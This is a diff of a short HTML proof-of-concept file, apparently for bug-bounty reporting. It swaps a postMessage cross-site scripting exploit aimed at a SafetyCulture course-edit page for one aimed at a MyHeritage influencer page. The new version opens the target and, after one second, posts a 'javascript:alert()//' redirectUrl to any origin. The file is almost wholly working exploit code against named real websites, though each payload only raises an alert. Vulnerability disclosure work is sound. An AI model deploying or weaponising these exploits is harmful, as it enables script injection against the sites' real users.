@@ -1,31 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>XSS POC - SafetyCulture</title>
-    <style>
-        body { font-family: Arial; padding: 20px; }
-        button { padding: 10px 20px; margin: 10px; }
-    </style>
-</head>
-<body>
-    <h1>SafetyCulture XSS Vulnerability Proof</h1>
-    <p>Click the button to demonstrate the security issue:</p>
-    <button onclick="showPOC()">Show XSS Vulnerability</button>
-    
+  <body>
+    <h1>postMessage</h1>
     <script>
-    function showPOC() {
-        // Open target site
-        const target = window.open(
-            'https://app.eu.safetyculture.com/training/manage/course/68e03861080c66ba8992a5ad/edit',
-            'poc',
-            'width=1000,height=700'
+      const target = window.open("https://influencers.myheritage.com/dansmescordes/?redirectUrl=xss://x.com");
+         
+      setTimeout(() => {
+        target.postMessage(
+          {
+            redirectUrl: "javascript:alert()//" 
+          },
+          "*"
         );
-        
-        // Execute POC after page loads
-        setTimeout(() => {
-            target.postMessage('alert("🚨 XSS Vulnerability Confirmed")', '*');
-        }, 3000);
-    }
+      }, 1000);
     </script>
-</body>
+  </body>
 </html>
